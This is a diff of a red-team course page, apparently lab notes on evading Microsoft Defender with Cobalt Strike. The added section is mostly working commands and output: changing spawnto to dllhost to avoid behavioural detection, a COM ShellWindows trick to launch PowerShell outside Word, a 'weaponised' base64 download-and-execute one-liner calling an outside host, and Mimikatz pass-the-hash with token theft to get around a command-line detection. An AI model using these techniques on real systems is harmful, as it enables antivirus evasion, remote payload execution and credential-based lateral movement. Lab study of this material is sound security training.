@@ -2,7 +2,7 @@
 description: 10/04/2025
 ---
 
-# Microsoft Defender Antivirus
+# ✅ Microsoft Defender Antivirus
 
 ## Introduction
 
@@ -31,7 +31,7 @@ These are then converted into Position Independent Shellcode, which when injecte
 
 The reflective loader then loads the Beacon DLL into memory and kicks off a new thread to run it.
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Settings from **Malleable C2 profile**, such as the callback addresses are stomped into the DLL at the time your payloads are generated.
 
@@ -43,7 +43,7 @@ They all, with the exception of the service binary, inject Beacon shellcode into
 
 **That flow looks something like this:**
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The service binary is identical except that it spawns another process and performs remote injection instead.
 
@@ -98,7 +98,7 @@ and verify that Windows Defender indeed blocked the attempt.
 
 **If we copy the payload to our local desktop and check the associated log, we can see that the "file" was detected:**
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 These Cobalt Strike "artifacts" are nothing more than shellcode runners that inject Beacon shellcode when executed.&#x20;
 
@@ -268,7 +268,7 @@ Launch **Ghidra** by running the start script at <mark style="color:yellow;">`C:
 
 Create a new non-shared project from _**File** > **New Project**,_ then import your artifact by going to _**File** > **Import File**_.
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 Double-click on the imported file to open it in the CodeBrowser.
 
@@ -280,7 +280,7 @@ The first is to search for a specific byte sequence output by ThreatCheck, for e
 
 Go to _**Search** > **Memory**_, paste the string into the search box and click _Search All_.
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Here we have one result.
 
@@ -288,19 +288,19 @@ Here we have one result.
 
 Clicking on it will take you to the location in the code browser.
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 The other method is to use the "bad bytes offset" as given by ThreatCheck.
 
 _**Select Navigation** > **Go To**_ and enter <mark style="color:yellow;">`file(n)`</mark> where <mark style="color:yellow;">`n`</mark> is the offset.  In this case it would be <mark style="color:yellow;">`file(0xBEC)`</mark>.
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Unfortunately, we do not have debug symbols for the compiled payloads so function and variable names will be quite generic, like like `FUN_xxx` and `lVarx`. &#x20;
 
 However, we can still quite easily see that the portion of highlighted code is a <mark style="color:yellow;">`for`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">loop</mark>.  We can go back to the Artifact Kit source code and search for any such loops.
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can dismiss most of these files because we didn't use the _**readfile**_ bypass nor did we enable syscalls. &#x20;
 
@@ -308,7 +308,7 @@ Therefore, the candidates in <mark style="color:yellow;">`patch.c`</mark> seem t
 
 This <mark style="color:yellow;">`spawn`</mark> function under an <mark style="color:yellow;">`#ifdef _MIGRATE_`</mark> directive is a dead ringer for the decompiled version in Ghidra.
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
 :bulb:To break the detection, we just have to modify the routine so that it compiles to a different byte sequence.&#x20;
@@ -353,7 +353,7 @@ This time we have a different signature - _**this is an iterative process, so we
 
 This one seems related to the `sprintf` call used to create the pseudo-random pipe name in <mark style="color:yellow;">bypass-pipe.c</mark>.
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 **We can get around this one from changing this:**
 
@@ -1237,3 +1237,281 @@ The primary reason to do this is to ensure that unstable post-ex tools don't cra
 
 <figure><img src="../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>
 
+`rundll32` being the default "spawnto" for Cobalt Strike has been a thing for a long time and is now a common point of detection.
+
+The service binary payload used by `psexec` also used this by default, which is why you see those Beacons running as `rundll32.exe`.
+
+The process used for post-ex commands and `psexec` can be changed on the fly in the CS GUI.
+
+To change the post-ex process, use the `spawnto` command.
+
+x86 and x64 must be specified individually and environment variables can also be used.
+
+```
+beacon> spawnto x64 %windir%\sysnative\dllhost.exe
+beacon> spawnto x86 %windir%\syswow64\dllhost.exe
+```
+
+{% hint style="info" %}
+The sysnative and `syswow64` paths should be used rather than `system32`.
+{% endhint %}
+
+If we then use powerpick to get its own process name, it will return `dllhost`.
+
+```
+beacon> powerpick Get-Process -Id $pid | select ProcessName
+
+ProcessName
+-----------
+dllhost 
+```
+
+powerpick + PowerView will now run on the file server without being caught by AMSI or this behavioural detection.
+
+```
+beacon> run hostname
+fs
+
+beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+beacon> powerpick Get-Domain
+
+Forest                  : cyberbotic.io
+DomainControllers       : {dc-2.dev.cyberbotic.io}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : cyberbotic.io
+PdcRoleOwner            : dc-2.dev.cyberbotic.io
+RidRoleOwner            : dc-2.dev.cyberbotic.io
+InfrastructureRoleOwner : dc-2.dev.cyberbotic.io
+Name                    : dev.cyberbotic.io
+```
+
+Use the spawnto command without any argument to reset back to default.
+
+```
+beacon> spawnto
+[*] Tasked beacon to spawn features to default process
+```
+
+You may also set the spawnto inside malleable C2 by including the `spawnto_x64` and `spawnto_x86` directives inside the post-ex block. &#x20;
+
+**Every new Beacon will then use this as their new default:**
+
+```
+post-ex {
+        set amsi_disable "true";
+
+        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
+        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
+}
+```
+
+When moving laterally with psexec, Beacon will attempt to use the spawnto setting from your malleable C2 profile. &#x20;
+
+However, it cannot use environment variables (such as `%windir%`), so will fall back to rundll32 in those cases. &#x20;
+
+**You can override this at runtime with the `ak-settings` command to specify an absolute path instead:**
+
+```
+beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
+[*] Updating the spawnto_x64 process to 'C:\Windows\System32\dllhost.exe'
+[*] artifact kit settings:
+[*]    service     = ''
+[*]    spawnto_x86 = 'C:\Windows\SysWOW64\rundll32.exe'
+[*]    spawnto_x64 = 'C:\Windows\System32\dllhost.exe'
+
+beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
+[*] Updating the spawnto_x86 process to 'C:\Windows\SysWOW64\dllhost.exe'
+[*] artifact kit settings:
+[*]    service     = ''
+[*]    spawnto_x86 = 'C:\Windows\SysWOW64\dllhost.exe'
+[*]    spawnto_x64 = 'C:\Windows\System32\dllhost.exe'
+```
+
+&#x20;You may also change the name of the service (rather than 7 random characters) with `ak-settings service [name]`.
+
+Lateral movement with psexec will then land us in dllhost.exe.
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+## Parent/Child Relationships
+
+A subset of behavioural detections come from the parent/child relationships of running processes.
+
+As a rule of thumb, the parent of a process is the process that started it.
+
+As such, a process only has one parent, but can have many children.
+
+Applications such as _**Process Hacker**_ visualize these relationships by their indentation.
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**The&#x20;**_**Details**_**&#x20;window also shows a process' parent:**
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Most user applications will run as children of explorer (`explorer.exe`), as that is where they're started from.
+
+### Suspicious/Malicious Parent/Child Relationships
+
+There are many parent/child relationships that are considered highly suspicious or outright malicious.
+
+One example is with our access payload.
+
+Since we have executed a PowerShell one-liner via an Office Macro, the instance of `powershell.exe` becomes a child of `winword.exe`.
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Defender does a good job of blocking these because Word spawning PowerShell is not exactly common behavior and is well-known phishing tactic.
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:green;">One way around this is to find a way to execute PowerShell without it become a child of Word</mark>. &#x20;
+
+A <mark style="color:green;">very low-effort way to do that is with COM</mark>. &#x20;
+
+_**Remember the COM objects from the**_ [_**DCOM lateral movement**_](https://hacking.swizsecurity.com/hacking_methodology/command-and-control-c2/lateral-movement#distributed-component-object-model-dcom) _**module?**_ &#x20;
+
+Well, the same can be used for local execution too. &#x20;
+
+The nicer ones to use in this scenario are `ShellWindows` and `ShellBrowserWindow`, because they will both spawn processes under explorer. &#x20;
+
+**This a simple example of spawning a hidden PowerShell process using ShellWindows:**
+
+```powershell
+Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
+Set obj = shellWindows.Item()
+obj.Document.Application.ShellExecute "powershell.exe", Null, Null, Null, 0
+```
+
+The arguments for the ShellExecute method are documented [here](https://learn.microsoft.com/en-gb/windows/win32/shell/shell-shellexecute).
+
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+**Here is a weaponised example:**
+
+```
+Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
+Set obj = shellWindows.Item()
+obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0
+```
+
+## Command-Line Detections
+
+Defender also has the ability to inspect the command-line arguments of a process and can prevent it from starting if it has malicious content.
+
+**A common place you may find this is with the built-in `pth` command:**
+
+```
+beacon> getuid
+[*] You are DEV\bfarmer (admin)
+
+beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
+```
+
+**We can see from the console log that this expands to:**
+
+{% code overflow="wrap" %}
+```
+sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:"%COMSPEC% /c echo 9c91bb58485 > \\.\pipe\34a65a"
+```
+{% endcode %}
+
+**However, you will get an access denied error when Mimikatz tries to call `CreateProcessWithLogonW:`**
+
+```
+user	: jking
+domain	: DEV
+program	: C:\Windows\system32\cmd.exe /c echo 9c91bb58485 > \\.\pipe\34a65a
+impers.	: no
+NTLM	: 59fc0f884922b4ce376051134c71e22c
+ERROR kuhl_m_sekurlsa_pth ; CreateProcessWithLogonW (0x00000005)
+```
+
+It's not entirely obvious on the surface that this is caused by Defender, but you can see the alert in both in the GUI and via `Get-MpThreatDetection`. &#x20;
+
+The "CmdLine" prefix gives away the origin of the detection. &#x20;
+
+In this case, it's the `echo x > \\.\pipe\` pattern as this is synonymous with named pipe impersonation (also obvious from the title of the alert).
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+```
+ActionSuccess                  : True
+AdditionalActionsBitMask       : 0
+AMProductVersion               : 4.18.2205.7
+CleaningActionID               : 3
+CurrentThreatExecutionStatusID : 0
+DetectionID                    : {2773A98F-C5FE-4BA2-B6F1-96C2F4D296D4}
+DetectionSourceTypeID          : 2
+DomainUser                     : NT AUTHORITY\SYSTEM
+InitialDetectionTime           : 10/30/2023 2:25:56 PM
+LastThreatStatusChangeTime     : 10/30/2023 2:26:42 PM
+ProcessName                    : Unknown
+RemediationTime                : 10/30/2023 2:26:42 PM
+Resources                      : {CmdLine:_C:\Windows\System32\cmd.exe /c echo 9c91bb58485 > \\.\pipe\34a65a}
+ThreatID                       : 2147735445
+ThreatStatusErrorCode          : 0
+ThreatStatusID                 : 4
+PSComputerName                 :
+```
+
+The reason this returns an access denied (i.e. `error code 5`) is because the enforcement is coming from the Windows Defender driver in the kernel. &#x20;
+
+This driver receives [notifications](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pcreate_process_notify_routine_ex) when new processes are being created, which contain a  [PS\_CREATE\_NOTIFY\_INFO](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-_ps_create_notify_info) structure. &#x20;
+
+The eagle-eyed will spot the `CreationStatus` member, which is the `NTSTATUS` value to return. &#x20;
+
+The driver can simply set this to `STATUS_ACCESS_DENIED` to prevent the process from starting, and that error code propagates down to the caller.
+
+Bypassing or disabling kernel-level callbacks is out of scope for RTO. &#x20;
+
+The <mark style="color:green;">easiest workaround is to find a way to achieve the same goal but in a way that doesn't involve the same command line arguments</mark>. &#x20;
+
+For pass-the-hash, we can simply start an arbitrary process and steal its token manually.
+
+```
+beacon> mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
+
+user	: jking
+domain	: DEV
+program	: notepad.exe
+impers.	: no
+NTLM	: 59fc0f884922b4ce376051134c71e22c
+  |  PID  17896
+  |  TID  11384
+  |  LSA Process is now R/W
+  |  LUID 0 ; 8586493 (00000000:008304fd)
+  \_ msv1_0   - data copy @ 00000129694D4070 : OK !
+  \_ kerberos - data copy @ 00000129694CCD28
+
+beacon> steal_token 17896
+[+] Impersonated DEV\bfarmer
+
+beacon> ls \\web.dev.cyberbotic.io\c$
+[*] Listing: \\web.dev.cyberbotic.io\c$\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     08/15/2022 18:50:13   $Recycle.Bin
+          dir     08/10/2022 04:55:17   $WinREAgent
+          dir     08/10/2022 05:05:53   Boot
+          dir     08/18/2021 23:34:55   Documents and Settings
+          dir     08/19/2021 06:24:49   EFI
+          dir     08/15/2022 18:58:09   inetpub
+          dir     05/08/2021 08:20:24   PerfLogs
+          dir     09/26/2023 08:38:47   Program Files
+          dir     08/10/2022 04:06:16   Program Files (x86)
+          dir     10/30/2023 13:58:46   ProgramData
+          dir     08/15/2022 18:31:08   Recovery
+          dir     11/02/2022 09:32:00   System Volume Information
+          dir     08/30/2022 17:51:08   Users
+          dir     09/26/2023 08:51:14   Windows
+ 427kb    fil     08/10/2022 05:00:07   bootmgr
+ 1b       fil     05/08/2021 08:14:33   BOOTNXT
+ 12kb     fil     10/30/2023 13:27:39   DumpStack.log.tmp
+ 384mb    fil     10/30/2023 13:27:39   pagefile.sys
+```
